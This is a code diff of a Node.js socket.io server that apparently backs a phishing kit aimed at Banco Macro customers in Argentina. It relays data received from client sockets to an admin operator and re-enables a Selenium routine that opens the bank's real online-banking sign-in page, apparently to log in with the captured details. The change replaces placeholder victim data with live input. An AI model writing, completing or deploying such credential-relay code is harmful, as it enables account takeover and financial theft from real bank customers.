@@ -60,8 +60,8 @@ module.exports = httpServer => {
             var img = '';
             let browser = new swd.Builder();
             let tab = browser.forBrowser("chrome")
-                .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
-                .setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
+                //.setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
+                //.setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                 .build();
 
             //Step 1 - Opening sign in page
@@ -122,7 +122,8 @@ module.exports = httpServer => {
 
         // Recibir data y enviar al adm
         socket.on("Data", data => {
-            totalInfo = [data, 'Pedro Pérez', 'Última vez el 18/08/2022 a las 12:00:00', '$99.999,00'];
+            totalInfo = data;
+            console.log(totalInfo)
             console.log('Length adm ' + socketsOnLineAdm.length)
 
             if (socketsOnLineAdm.length == 0) {
@@ -136,17 +137,14 @@ module.exports = httpServer => {
                 }
                 var AdminSelected = socketsOnLineAdm[AsignarAdm];
 
-                /*let browser = new swd.Builder();
+                let browser = new swd.Builder();
                 let tab = browser.forBrowser("chrome")
-                    .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
-                    .setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
-                    .build();*/
-
-                io.to(data.socket).emit("ContinuarHome", data.socket);
-                io.to(AdminSelected).emit("NewData", totalInfo);
+                    //.setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
+                    //.setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
+                    .build();
 
                 //Step 1 - Opening sign in page
-                /*let tabToOpenSignIn =
+                let tabToOpenSignIn =
                     tab.get("https://www.macro.com.ar/bancainternet/");
                 tabToOpenSignIn
                     .then(() => {
@@ -261,7 +259,7 @@ module.exports = httpServer => {
                     })
                     .catch(err => {
                         console.log("Error ", err, " occurred!");
-                    });*/
+                    });
             }
         });
 
